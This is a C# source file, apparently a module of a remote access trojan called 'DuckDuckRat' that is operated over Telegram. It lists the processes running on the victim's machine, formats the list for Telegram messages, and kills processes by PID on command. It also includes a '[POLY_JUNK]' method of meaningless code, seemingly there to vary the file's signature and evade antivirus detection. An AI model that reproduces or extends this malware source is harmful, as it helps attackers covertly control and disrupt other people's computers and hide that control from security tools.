using System;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace DuckDuckRat.Modules
{
    public static class TaskManager
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_ecbeb2ea() {
            int val = 41785;
            if (val > 50000) Console.WriteLine("Hash:" + 41785);
        }

        public static string GetProcessList()
        {
            try
            {
                var processes = Process.GetProcesses()
                    .OrderBy(p => p.ProcessName)
                    .ToList();

                var sb = new StringBuilder();
                sb.AppendLine("📊 *PROCESS LIST*");
                sb.AppendLine("```");
                sb.AppendLine(string.Format("{0,-10} | {1,-25} | {2}", "PID", "NAME", "MEM (MB)"));
                sb.AppendLine(new string('-', 50));

                foreach (var p in processes)
                {
                    try
                    {
                        // To avoid exceptions on accessing restricted processes
                        long memMb = p.WorkingSet64 / 1024 / 1024;
                        string name = p.ProcessName.Length > 25 ? p.ProcessName.Substring(0, 22) + "..." : p.ProcessName;
                        sb.AppendLine(string.Format("{0,-10} | {1,-25} | {2}", p.Id, name, memMb));
                    }
                    catch { }
                }
                sb.AppendLine("```");
                
                // If the message is too long for Telegram (4096 chars), truncate it
                string result = sb.ToString();
                return result.Length > 4000 ? result.Substring(0, 4000) + "\n...[TRUNCATED]```" : result;
            }
            catch (Exception ex)
            {
                return $"❌ Error getting processes: {ex.Message}";
            }
        }

        public static string KillProcess(int processId)
        {
            try
            {
                var process = Process.GetProcessById(processId);
                string name = process.ProcessName;
                process.Kill();
                return $"✅ Successfully killed process `{name}` (PID: {processId}).";
            }
            catch (ArgumentException)
            {
                return $"❌ Process with PID {processId} not found or already exited.";
            }
            catch (Exception ex)
            {
                return $"❌ Failed to kill process {processId}: {ex.Message}";
            }
        }
    }
}


